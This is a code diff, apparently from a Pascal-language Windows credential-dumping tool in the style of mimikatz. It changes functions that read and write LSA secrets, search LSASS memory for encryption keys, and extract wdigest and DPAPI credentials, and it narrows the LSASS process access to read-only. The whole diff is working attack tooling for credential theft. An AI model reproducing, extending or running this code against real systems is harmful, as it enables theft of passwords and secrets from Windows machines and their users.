@@ -19,7 +19,8 @@ function wdigest_DisableCredGuard(pid:dword):boolean;
 
 function dpapi(pid:dword):boolean;
 
-function lsasecret(server:string;key:string;var output:tbytes):boolean;
+function lsa_get_secret(server:string;key:string;var output:tbytes):boolean;
+function lsa_set_secret(const Server, KeyName,Password: string): Boolean;
 //function dumpsecret(const syskey:tbyte16;regkey:string;var output:tbytes):boolean;
 
 var
@@ -191,6 +192,17 @@ type
         end;
      KIWI_BCRYPT_HANDLE_KEY=_KIWI_BCRYPT_HANDLE_KEY;
 
+Procedure LsaInitUnicodeString(Var LsaString: LSA_UNICODE_STRING; Const WS: WideString);
+Begin
+  FillChar(LsaString, SizeOf(LsaString), 0);
+  If WS <> '' Then
+  Begin
+    LsaString.Length:=Length(WS) * SizeOf(WideChar);
+    LsaString.MaximumLength:=LsaString.Length + SizeOf(WideChar);
+    LsaString.Buffer:=PWideChar(WS);
+  End;
+End;
+
      procedure CreateFromStr (var value:LSA_UNICODE_STRING; st : string);
      var
        len : Integer;
@@ -286,7 +298,50 @@ begin
 log('**** dumpsecret:'+BoolToStr (result)+' ****');
 end;
 
-function lsasecret(server:string;key:string;var output:tbytes):boolean;
+{
+As described in Private Data Object, private data objects include three specialized types:
+local, global, and machine. Specialized objects are identified by a prefix in the key name:
+"L$" for local objects,"G$" for global objects,and "M$" for machine objects.
+Local objects cannot be accessed remotely. Machine objects can be accessed only by the operating system.
+}
+function lsa_set_secret(const Server, KeyName,Password: string): Boolean;
+const
+POLICY_GET_PRIVATE_INFORMATION = 4 ;
+POLICY_TRUST_ADMIN = 8 ;
+POLICY_CREATE_ACCOUNT = 16 ;
+POLICY_CREATE_SECRET = 32 ;
+POLICY_CREATE_PRIVILEGE = 64 ;
+var
+  oa                : LSA_OBJECT_ATTRIBUTES;
+  hPolicy           : LSA_HANDLE;
+  usServer          : LSA_UNICODE_STRING;
+  usKeyName         : LSA_UNICODE_STRING;
+  usPassWord        : LSA_UNICODE_STRING;
+  Status            : NTSTATUS;
+begin
+  ZeroMemory(@oa, sizeof(oa));
+  oa.Length := sizeof(oa);
+  try
+    if server<>'' then
+    begin
+    CreateFromStr(usServer, Server);
+    Status := _LsaOpenPolicy(@usServer, oa, POLICY_CREATE_SECRET, hPolicy);
+    end
+    else Status := _LsaOpenPolicy(nil, oa, POLICY_CREATE_SECRET, hPolicy);
+    if status=ERROR_SUCCESS then
+    begin
+      CreateFromStr(usKeyName, KeyName);
+      CreateFromStr(usPassWord, Password);
+      Status := _LsaStorePrivateData(hPolicy, @usKeyName, @usPassword);
+    end;
+  finally
+    _LsaClose(hPolicy);
+  end;
+  Result := Status=ERROR_SUCCESS;
+end;
+
+
+function lsa_get_secret(server:string;key:string;var output:tbytes):boolean;
 const
   POLICY_ALL_ACCESS = $00F0FFF;
 var
@@ -469,7 +524,7 @@ begin
 log('**** extractlsakeys ****');
 result:=false;
 //
-hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                       false,pid);
 //IV
 setlength(iv,16);
@@ -667,9 +722,8 @@ GetModuleInformation (getcurrentprocess,hmod,MODINFO ,sizeof(MODULEINFO));
 keySigOffset:=SearchMem(getcurrentprocess,MODINFO.lpBaseOfDll ,MODINFO.SizeOfImage,pattern);
 log('keySigOffset:'+inttohex(keySigOffset,sizeof(pointer)),0); //dd lsasrv!LsaInitializeProtectedMemory
 
-
 //lets search in lsass mem now
-hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                       false,pid);
 
 //we dont need the below apart from testing if module is loaded in lsass ...
@@ -838,6 +892,7 @@ var
   st:SYSTEMTIME ;
   bret:boolean;
 begin
+log( '**** dpapi ****');
 result:=false;
 //
    if (lowercase(osarch)='x86') then
@@ -973,7 +1028,7 @@ if offset=0 then exit;
 log('found:'+inttohex(offset,sizeof(pointer)),0);
 //
 hprocess:=thandle(-1);
-hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                       false,pid);
 
   if hprocess<>thandle(-1) then
@@ -1385,7 +1440,7 @@ begin
   log('found:'+inttohex(offset,sizeof(pointer)),0);
   //
   hprocess:=thandle(-1);
-  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+  hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION},
                                         false,pid);
   if hprocess<>thandle(-1) then
        begin
